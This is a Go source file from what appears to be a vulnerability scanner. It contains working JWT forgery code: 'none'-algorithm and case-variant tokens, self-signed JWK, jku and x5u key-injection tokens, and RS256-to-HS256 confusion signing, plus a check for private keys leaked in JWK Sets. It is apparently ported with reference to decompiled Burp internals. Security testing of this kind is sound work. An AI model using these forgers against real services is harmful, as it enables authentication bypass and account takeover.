// Package scanner: JWT forgery INFRA primitives for six declined scanner rows. This file adds no
// check and registers nothing in NativeCheckRegistry; see check_registry_declined.go for why these
// six remain declined ("no native JWT-forgery evaluator") and docs/SCANNER-COVERAGE.md for the count.
//
// # What this ports, and what there was nothing to port
//
// Burp's dispatcher for this issue family is burp.Zu4y (out/clean/root/Zu4y.java). Its only relevant
// content is a static field:
//
//	List.of(IssueType.JWT_SIGNATURE_NOT_VERIFIED, IssueType.JWT_NONE_ALG_SUPPORTED,
//	        IssueType.JWT_JWK_HEADER_SUPPORTED)
//
// confirming those three issues are one family — and nothing else. Grepping
// out/strings/map_root.tsv for `^burp\.Zu4y\t` returns zero rows. That is the honest shape of this
// check, not a gap in recovery: unlike an injection probe, whose "payload" is a static string Burp
// embeds as a class literal, a JWT forgery's payload is a keypair generated at signing time. There
// is no ZKM ciphertext to decode here because there was never a static secret for Zu4y to hide.
//
// What map_root.tsv did yield, from the sibling classes this family's headers and messages actually
// live in, corroborates field and issue names already given rather than inventing new ones:
//
//	burp.Zs83   literal "jku", "x5u" — the two header names ForgeWithJku/ForgeWithX5u forge.
//	burp.Zi8s   literal "alg", "jwk", "kid".
//	burp.Zwfx   finding prose for five of the six issues, e.g. `…appears to be trusted by the
//	            application even when using the "none" algorithm with an empty signature`,
//	            `…arbitrary key embedded in the "jwk" header to validate the token`,
//	            `…trust the "jku"/"x5u" header…fetched a public key [certificate] from an
//	            arbitrary URL…and attempted to use it to verify the signature`.
//	burp.Zc84   the catalog JSON filenames, which cross-check every DeclaredTypeIndex below against
//	            catalog_data.go independently of the task brief: 00200900/01/02/04/05 = 0x200900.. =
//	            2099456/57/58/60/61, and 00600800 = 0x600800 = 6293504.
//
// renamed_v4/JwkDisclosedIssue001.java (a related but distinct catalog entry, IssueType.JWK_DISCLOSED)
// additionally confirms the private-material vocabulary this file's scanner uses: its own literal
// text distinguishes a JWK Set that merely exposes public components from one that "contains private
// keys" that "could be used by an attacker to generate arbitrary valid JWTs" — exactly the
// RSA-d/p/q, EC-d distinction ScanForPrivateKeyInJWKS draws below.
//
// # The six declined rows this file's primitives unblock
//
//	2099456  JWT signature not verified             ForgeAlgConfusion, (JWTToken).SignatureVerifies
//	2099457  JWT none algorithm supported            ForgeNoneAlg, ForgeNoneAlgVariants
//	2099458  JWT self-signed JWK header supported    ForgeSelfSignedJWK
//	2099460  JWT arbitrary jku header supported      ForgeWithJku
//	2099461  JWT arbitrary x5u header supported      ForgeWithX5u
//	6293504  JWT private key disclosed               ScanForPrivateKeyInJWKS
//
// (2099459, JWT weak HMAC secret, is jwt_weak.go's JwtWeakSecretCheck and already native — a
// different problem from everything in this file, which is about forging a *valid-looking* signature
// rather than cracking a real one.)
//
// # Refuse-by-default
//
// ParseJWT never returns a partially-populated token on failure: a token that is not exactly three
// segments, or whose header does not decode to base64url JSON, gets ParseError set and every other
// field left at its zero value. Every Forge* function below checks ParseError before doing anything
// else, so feeding in a malformed token refuses rather than silently forging a token built from empty
// strings that merely *looks* like it came from somewhere.
//
// This is a pure classifier/generator package, matching checks_headers.go's shape: no network, no
// storage, no *core.Exchange. Each function takes already-observed input — an existing token, or
// bytes a caller already fetched — and returns typed output a future check evaluator can act on.
// Hosting a jku/x5u URL and sending the forged token are both that future evaluator's job, not this
// file's: ForgeWithJku and ForgeWithX5u return the bytes to host rather than serving them themselves,
// precisely so this package makes zero outbound connections.
//
// # ScanForPrivateKeyInJWKS does not trust a field name
//
// A JWK member that merely has a key called "d" is not proof of a disclosed private key — it is
// proof of a JSON object with a key called "d". This file only reports a kid when the claimed private
// material is mathematically load-bearing: for RSA, either p*q reproduces n directly, or d actually
// inverts e under n (round-tripped through modular exponentiation); for EC, d actually derives the
// same (x, y) the JWK itself publishes, via scalar multiplication on the named curve. That is the same
// bar jwt_weak.go holds itself to for its own family ("the check has either reproduced the signature
// or it has not") applied to key material instead of a signature.
package scanner

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

// JWTHeader is the subset of JOSE header members this file's forgeries read or write: the alg the
// token claims, the key-selection hints a verifier might trust instead of consulting a local key
// store (kid, jku, x5u, jwk, x5c), and typ for realism when passed through unchanged.
type JWTHeader struct {
	Alg, Typ, Kid, Jku, X5u string
	Jwk                     map[string]any
	X5c                     []string
}

// JWTToken is a parsed JWS compact-serialization token: the three raw segments a signature spans or
// a forgery replaces, the decoded header, the decoded payload claims, and — refuse-by-default —
// ParseError. See ParseJWT.
type JWTToken struct {
	RawHeader, RawPayload, RawSignature string
	Header                              JWTHeader
	Payload                             map[string]any
	ParseError                          string
}

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

// b64urlEncode is the encoding-direction sibling of jwt_weak.go's unexported b64urlDecode, reused
// directly since both live in package scanner. jwt_weak.go never needed an encoder because it only
// ever decodes captured tokens; this file forges new ones.
func b64urlEncode(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// stringField returns m[key] as a string, or "" if the key is absent or not a string.
func stringField(m map[string]any, key string) string {
	s, _ := m[key].(string)
	return s
}

// ParseJWT splits token into its three JWS compact-serialization segments (RFC 7515 §3.1) and
// decodes the header. Refuse-by-default: a token that is not exactly three dot-separated segments,
// or whose header segment does not decode to base64url JSON, returns a JWTToken with only
// ParseError set — every other field stays at its zero value, so a caller that skips the ParseError
// check (including every Forge* function in this file) gets nothing to work with rather than a
// plausible-looking partial token built from empty strings.
//
// The payload segment is decoded best-effort: an unparseable payload does not set ParseError,
// because RawPayload — the segment string every forger below reuses verbatim — does not need to be
// valid JSON to be reused, and a generic JWS payload is not required to be JSON at all. Only Payload,
// the decoded claim map, is left nil in that case.
func ParseJWT(token string) JWTToken {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return JWTToken{ParseError: fmt.Sprintf("expected 3 dot-separated segments, found %d", len(parts))}
	}
	headerBytes, ok := b64urlDecode(parts[0])
	if !ok {
		return JWTToken{ParseError: "header segment is not valid base64url"}
	}
	var rawHeader map[string]any
	if err := json.Unmarshal(headerBytes, &rawHeader); err != nil {
		return JWTToken{ParseError: "header segment is not valid JSON: " + err.Error()}
	}

	header := JWTHeader{
		Alg: stringField(rawHeader, "alg"),
		Typ: stringField(rawHeader, "typ"),
		Kid: stringField(rawHeader, "kid"),
		Jku: stringField(rawHeader, "jku"),
		X5u: stringField(rawHeader, "x5u"),
	}
	if jwk, ok := rawHeader["jwk"].(map[string]any); ok {
		header.Jwk = jwk
	}
	if x5c, ok := rawHeader["x5c"].([]any); ok {
		for _, v := range x5c {
			if s, ok := v.(string); ok {
				header.X5c = append(header.X5c, s)
			}
		}
	}

	var payload map[string]any
	if payloadBytes, ok := b64urlDecode(parts[1]); ok {
		_ = json.Unmarshal(payloadBytes, &payload) // best-effort; see doc comment above
	}

	return JWTToken{
		RawHeader:    parts[0],
		RawPayload:   parts[1],
		RawSignature: parts[2],
		Header:       header,
		Payload:      payload,
	}
}

// ---------------------------------------------------------------------------
// Shared forging helpers
// ---------------------------------------------------------------------------

// passthroughHeaderFields copies typ (and, when keepKid, kid) from the original token's header into
// a forged header map. Header tampering only replaces the fields the attack in question cares about;
// carrying the rest forward keeps the forged token structurally unremarkable rather than obviously
// different from the token it replaces.
func passthroughHeaderFields(h map[string]any, orig JWTHeader, keepKid bool) {
	if orig.Typ != "" {
		h["typ"] = orig.Typ
	}
	if keepKid && orig.Kid != "" {
		h["kid"] = orig.Kid
	}
}

// signRS256 signs signingInput with priv under RS256 (RSASSA-PKCS1-v1_5 using SHA-256, RFC 7518
// §3.3), the algorithm every RSA-keyed forger in this file emits.
func signRS256(priv *rsa.PrivateKey, signingInput string) ([]byte, error) {
	digest := sha256.Sum256([]byte(signingInput))
	return rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, digest[:])
}

// encodeRSAPublicKeyJWK renders pub as the kty/n/e member shape RFC 7518 §6.3.1 defines for an RSA
// public JWK, with n and e each base64url-encoded big-endian per that section's integer-encoding
// rule (minimum octets, no leading zero byte) — exactly what big.Int.Bytes returns.
func encodeRSAPublicKeyJWK(pub *rsa.PublicKey) map[string]any {
	return map[string]any{
		"kty": "RSA",
		"n":   b64urlEncode(pub.N.Bytes()),
		"e":   b64urlEncode(big.NewInt(int64(pub.E)).Bytes()),
	}
}

// ---------------------------------------------------------------------------
// alg: none
// ---------------------------------------------------------------------------

// ForgeNoneAlg rewrites t's header to claim the "none" algorithm and empties the signature segment —
// the unsecured-JWS bypass a verifier that honours "none" accepts with zero cryptographic evidence.
// Refuses if t itself failed to parse; see ParseJWT.
func ForgeNoneAlg(t JWTToken) (string, error) {
	return forgeNoneAlgAs(t, "none")
}

// ForgeNoneAlgVariants forges one token per case permutation of the literal "none". Real JWT
// libraries have shipped case-sensitive blocklists against exactly this algorithm name, which a
// differently-cased spelling — "None", "NONE", "nOnE" — bypasses just as completely as the lowercase
// form; an allowlist-vs-blocklist mistake is exactly as real here as anywhere else it shows up.
// Variants that fail to build (only possible when t itself failed to parse) are silently omitted, so
// an unparsed token yields an empty slice — nothing forgeable — rather than a slice padded with
// unusable entries.
func ForgeNoneAlgVariants(t JWTToken) []string {
	variants := []string{"none", "None", "NONE", "nOnE", "NoNe"}
	tokens := make([]string, 0, len(variants))
	for _, alg := range variants {
		if tok, err := forgeNoneAlgAs(t, alg); err == nil {
			tokens = append(tokens, tok)
		}
	}
	return tokens
}

// forgeNoneAlgAs builds the shape shared by ForgeNoneAlg and ForgeNoneAlgVariants: only alg (and,
// passed through, typ/kid) changes — the original payload and the absence of a signature are what
// make this attack what it is.
func forgeNoneAlgAs(t JWTToken, algLiteral string) (string, error) {
	if t.ParseError != "" {
		return "", fmt.Errorf("refusing to forge from an unparsed token: %s", t.ParseError)
	}
	header := map[string]any{"alg": algLiteral}
	passthroughHeaderFields(header, t.Header, true) // same claimed identity, so keep its kid too
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshaling forged header: %w", err)
	}
	return b64urlEncode(headerJSON) + "." + t.RawPayload + ".", nil
}

// ---------------------------------------------------------------------------
// Self-signed jwk / arbitrary jku / arbitrary x5u header forgery
// ---------------------------------------------------------------------------

// ForgeSelfSignedJWK forges a token that carries its own verification key: it generates a fresh
// RSA-2048 keypair, inlines the public half as the JWS "jwk" header member (RFC 7517 §4.1.3, in the
// kty/n/e shape RFC 7518 §6.3.1 defines for RSA public keys), and signs with the matching private
// key. A verifier that resolves the key from the token's own jwk header — rather than from a locally
// trusted key store — finds this signature valid, because it genuinely is: infra_jwt_test.go proves
// the embedded key verifies the signature it travels with, rather than merely asserting the header
// field is present.
func ForgeSelfSignedJWK(t JWTToken) (token string, pub *rsa.PublicKey, err error) {
	if t.ParseError != "" {
		return "", nil, fmt.Errorf("refusing to forge from an unparsed token: %s", t.ParseError)
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", nil, fmt.Errorf("generating forged rsa key: %w", err)
	}
	header := map[string]any{
		"alg": "RS256",
		"jwk": encodeRSAPublicKeyJWK(&priv.PublicKey),
	}
	passthroughHeaderFields(header, t.Header, false) // a brand new key needs no kid tying it to the original signer
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", nil, fmt.Errorf("marshaling forged header: %w", err)
	}
	signingInput := b64urlEncode(headerJSON) + "." + t.RawPayload
	sig, err := signRS256(priv, signingInput)
	if err != nil {
		return "", nil, fmt.Errorf("signing forged token: %w", err)
	}
	return signingInput + "." + b64urlEncode(sig), &priv.PublicKey, nil
}

// forgedJkuKid is the kid ForgeWithJku's tokens use, matched between the JWS header (so a verifier
// that selects a key by kid finds one) and the returned JWKS document's own key (so the selected kid
// actually resolves to the embedded key).
const forgedJkuKid = "burpsy-forged-jku"

// ForgeWithJku forges a token whose "jku" header points at jkuURL, where a verifier that fetches and
// trusts whatever key set is hosted there resolves the attacker's own key and accepts the signature.
// This package makes no outbound connections (see the file header), so it returns the JWKS document
// bytes verbatim rather than fetching or serving jkuURL itself: the caller — who alone knows how
// jkuURL needs to be reachable from the target — serves those bytes there.
func ForgeWithJku(t JWTToken, jkuURL string) (token string, jwks []byte, err error) {
	if t.ParseError != "" {
		return "", nil, fmt.Errorf("refusing to forge from an unparsed token: %s", t.ParseError)
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", nil, fmt.Errorf("generating forged rsa key: %w", err)
	}
	jwk := encodeRSAPublicKeyJWK(&priv.PublicKey)
	jwk["kid"] = forgedJkuKid
	jwks, err = json.Marshal(map[string]any{"keys": []any{jwk}})
	if err != nil {
		return "", nil, fmt.Errorf("marshaling forged jwks: %w", err)
	}
	header := map[string]any{
		"alg": "RS256",
		"jku": jkuURL,
		"kid": forgedJkuKid,
	}
	passthroughHeaderFields(header, t.Header, false) // new key material gets the fresh kid above, not the original signer's
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", nil, fmt.Errorf("marshaling forged header: %w", err)
	}
	signingInput := b64urlEncode(headerJSON) + "." + t.RawPayload
	sig, err := signRS256(priv, signingInput)
	if err != nil {
		return "", nil, fmt.Errorf("signing forged token: %w", err)
	}
	return signingInput + "." + b64urlEncode(sig), jwks, nil
}

// ForgeWithX5u forges a token whose "x5u" header points at x5uURL, where a verifier that fetches and
// trusts whatever certificate is hosted there extracts the attacker's public key from it and accepts
// the signature. As with ForgeWithJku, this package makes no outbound connections: it returns the
// PEM-encoded self-signed certificate bytes and the caller serves them at x5uURL.
func ForgeWithX5u(t JWTToken, x5uURL string) (token string, certPEM []byte, err error) {
	if t.ParseError != "" {
		return "", nil, fmt.Errorf("refusing to forge from an unparsed token: %s", t.ParseError)
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", nil, fmt.Errorf("generating forged rsa key: %w", err)
	}
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "burpsy-jwt-forge"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, template, template, &priv.PublicKey, priv)
	if err != nil {
		return "", nil, fmt.Errorf("generating forged certificate: %w", err)
	}
	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	header := map[string]any{
		"alg": "RS256",
		"x5u": x5uURL,
	}
	passthroughHeaderFields(header, t.Header, false) // new key material, no tie to the original signer's kid
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", nil, fmt.Errorf("marshaling forged header: %w", err)
	}
	signingInput := b64urlEncode(headerJSON) + "." + t.RawPayload
	sig, err := signRS256(priv, signingInput)
	if err != nil {
		return "", nil, fmt.Errorf("signing forged token: %w", err)
	}
	return signingInput + "." + b64urlEncode(sig), certPEM, nil
}

// ---------------------------------------------------------------------------
// RS256 -> HS256 algorithm confusion, and telling "forged wrong" from "never checked"
// ---------------------------------------------------------------------------

// ForgeAlgConfusion re-signs t as HS256 using rsaPublicKeyPEM's own bytes as the HMAC secret — the
// RS256-to-HS256 confusion attack. It targets a verifier that resolves key material by kid/alg
// without pinning which algorithm family that material may be used with: told alg is now HS256, it
// treats the bytes it would otherwise use to verify an RS256 signature as a symmetric HMAC secret —
// a secret an attacker already has a copy of, because it is the server's *public* key. The bytes are
// used exactly as passed, with no re-encoding: which representation (PEM, DER, a JWKS-derived PEM) a
// real target's key material comes in is exactly the detail this attack is sensitive to, so this
// function must not paper over it with a canonical form the target does not actually use.
func ForgeAlgConfusion(t JWTToken, rsaPublicKeyPEM []byte) (string, error) {
	if t.ParseError != "" {
		return "", fmt.Errorf("refusing to forge from an unparsed token: %s", t.ParseError)
	}
	header := map[string]any{"alg": "HS256"}
	passthroughHeaderFields(header, t.Header, true) // targets the same kid, so the verifier resolves the same key bytes
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshaling forged header: %w", err)
	}
	signingInput := b64urlEncode(headerJSON) + "." + t.RawPayload
	mac := hmac.New(sha256.New, rsaPublicKeyPEM)
	mac.Write([]byte(signingInput))
	return signingInput + "." + b64urlEncode(mac.Sum(nil)), nil
}

// SignatureVerifies reports whether secretOrKey reproduces t's signature under HS256 — the algorithm
// every HMAC-signed token this file forges (ForgeAlgConfusion) actually emits. It exists so a caller
// that replayed a forged or tampered token can tell "the server accepted it because it never checked
// the signature" apart from "the server rejected it because we forged it wrong", which look
// identical from the outside without independently recomputing the signature. A token claiming any
// other alg is reported unverified rather than guessed at against an algorithm it never used.
func (t JWTToken) SignatureVerifies(secretOrKey []byte) bool {
	if !strings.EqualFold(t.Header.Alg, "HS256") {
		return false
	}
	sig, ok := b64urlDecode(t.RawSignature)
	if !ok {
		return false
	}
	mac := hmac.New(sha256.New, secretOrKey)
	mac.Write([]byte(t.RawHeader + "." + t.RawPayload))
	return hmac.Equal(sig, mac.Sum(nil))
}

// ---------------------------------------------------------------------------
// Private key disclosure in a JWK Set
// ---------------------------------------------------------------------------

// ScanForPrivateKeyInJWKS finds JWK Set members that leak private key material — the "JWT private
// key disclosed" primitive (DeclaredTypeIndex 6293504) — and returns the kid of each offending
// member. body may be a standard JWKS document ({"keys": [...]}), a bare array of JWK objects, or a
// single bare JWK object (the shape a caller that extracted just a token's own "jwk" header will have
// on hand); anything else, including invalid JSON, yields nil rather than a panic or a guess.
//
// A member is only reported when its claimed private material is mathematically load-bearing, not
// merely present under the expected field name — see rsaJWKDiscloses and ecJWKDiscloses.
func ScanForPrivateKeyInJWKS(body []byte) []string {
	var doc any
	if err := json.Unmarshal(body, &doc); err != nil {
		return nil
	}
	var offending []string
	for i, member := range jwkMembersOf(doc) {
		leaks := false
		switch stringField(member, "kty") {
		case "RSA":
			leaks = rsaJWKDiscloses(member)
		case "EC":
			leaks = ecJWKDiscloses(member)
		}
		if leaks {
			offending = append(offending, jwkKidOrPlaceholder(member, i))
		}
	}
	return offending
}

// jwkMembersOf normalizes the three body shapes ScanForPrivateKeyInJWKS accepts down to a slice of
// JWK member objects.
func jwkMembersOf(doc any) []map[string]any {
	switch v := doc.(type) {
	case map[string]any:
		if rawKeys, ok := v["keys"]; ok {
			arr, ok := rawKeys.([]any)
			if !ok {
				return nil
			}
			return jwkObjectsOf(arr)
		}
		if _, ok := v["kty"]; ok {
			return []map[string]any{v}
		}
		return nil
	case []any:
		return jwkObjectsOf(v)
	default:
		return nil
	}
}

// jwkObjectsOf keeps only the elements of arr that decoded as JSON objects.
func jwkObjectsOf(arr []any) []map[string]any {
	out := make([]map[string]any, 0, len(arr))
	for _, e := range arr {
		if m, ok := e.(map[string]any); ok {
			out = append(out, m)
		}
	}
	return out
}

// jwkKidOrPlaceholder names an offending member by its kid, or by position when kid is absent or
// empty — an offending key with no kid is still offending, and dropping it silently instead of
// naming it positionally would undercount rather than merely mislabel it.
func jwkKidOrPlaceholder(jwk map[string]any, index int) string {
	if kid := stringField(jwk, "kid"); kid != "" {
		return kid
	}
	return fmt.Sprintf("(no kid, key %d)", index)
}

// jwkBigInt decodes a base64url big-endian integer member of a JWK (RFC 7518 §6.3.1's n/e/d/p/q, or
// §6.2.1's x/y/d for EC), or reports it absent/unusable. Reuses jwt_weak.go's b64urlDecode rather
// than a second base64url decoder.
func jwkBigInt(jwk map[string]any, field string) (*big.Int, bool) {
	s := stringField(jwk, field)
	if s == "" {
		return nil, false
	}
	b, ok := b64urlDecode(s)
	if !ok || len(b) == 0 {
		return nil, false
	}
	return new(big.Int).SetBytes(b), true
}

// rsaJWKDiscloses proves that an RSA JWK member's private fields are genuinely load-bearing rather
// than merely present: either p*q reproduces n directly (RFC 7518 §6.3.2's prime factors), or d
// actually inverts e under n, checked by round-tripping a probe value through modular exponentiation
// with e and then d. A "d" that does not invert e cannot decrypt or sign anything for this key — it
// is not usable private material even if the JSON carries that member — so presence alone is not
// proof, mirroring jwt_weak.go's rule that only a reproduced signature counts, applied here to key
// material instead of a signature.
func rsaJWKDiscloses(jwk map[string]any) bool {
	n, okN := jwkBigInt(jwk, "n")
	if !okN || n.Sign() <= 0 {
		return false
	}
	if p, okP := jwkBigInt(jwk, "p"); okP {
		if q, okQ := jwkBigInt(jwk, "q"); okQ {
			if new(big.Int).Mul(p, q).Cmp(n) == 0 {
				return true
			}
		}
	}
	d, okD := jwkBigInt(jwk, "d")
	if !okD || d.Sign() <= 0 {
		return false
	}
	e, okE := jwkBigInt(jwk, "e")
	if !okE {
		// "e" is a mandatory RSA JWK member (RFC 7518 §6.3.1); a member missing it is already
		// non-conformant. 65537 is the near-universal public exponent in practice, so trying it
		// rather than giving up lets a d-without-e leak still be caught by the round-trip below
		// instead of silently passing as "not disclosed".
		e = big.NewInt(65537)
	}
	return rsaExponentsAreInverse(n, e, d)
}

// rsaExponentsAreInverse round-trips a small probe value through cipher = probe^e mod n, plain =
// cipher^d mod n: plain == probe if and only if d and e are genuinely inverse exponents for this
// modulus. probe is 2, which is coprime to every valid RSA modulus (always odd, being a product of
// two odd primes), so the round trip is a valid witness whenever n is a real RSA modulus.
func rsaExponentsAreInverse(n, e, d *big.Int) bool {
	if n.Cmp(big.NewInt(3)) <= 0 {
		return false
	}
	probe := big.NewInt(2)
	cipher := new(big.Int).Exp(probe, e, n)
	plain := new(big.Int).Exp(cipher, d, n)
	return plain.Cmp(probe) == 0
}

// ecJWKDiscloses proves that an EC JWK member's "d" is a genuine private scalar rather than merely a
// field with that name: it derives the public point d*G on the JWK's own named curve and checks that
// the point equals the (x, y) the same JWK publishes. A d that does not derive the member's own
// public point cannot sign anything as that key, so — as with the RSA case above — presence alone
// earns no finding.
func ecJWKDiscloses(jwk map[string]any) bool {
	curve := ecCurveNamed(stringField(jwk, "crv"))
	if curve == nil {
		return false
	}
	d, okD := jwkBigInt(jwk, "d")
	x, okX := jwkBigInt(jwk, "x")
	y, okY := jwkBigInt(jwk, "y")
	if !okD || !okX || !okY || d.Sign() <= 0 {
		return false
	}
	candidate := &ecdsa.PrivateKey{
		PublicKey: ecdsa.PublicKey{Curve: curve, X: x, Y: y},
		D:         d,
	}
	derivedX, derivedY := candidate.Curve.ScalarBaseMult(candidate.D.Bytes())
	return derivedX.Cmp(candidate.X) == 0 && derivedY.Cmp(candidate.Y) == 0
}

// ecCurveNamed maps a JWK "crv" value to its stdlib curve, or nil for anything this file does not
// recognize — an unrecognized curve is refused rather than guessed at.
func ecCurveNamed(name string) elliptic.Curve {
	switch name {
	case "P-256":
		return elliptic.P256()
	case "P-384":
		return elliptic.P384()
	case "P-521":
		return elliptic.P521()
	default:
		return nil
	}
}
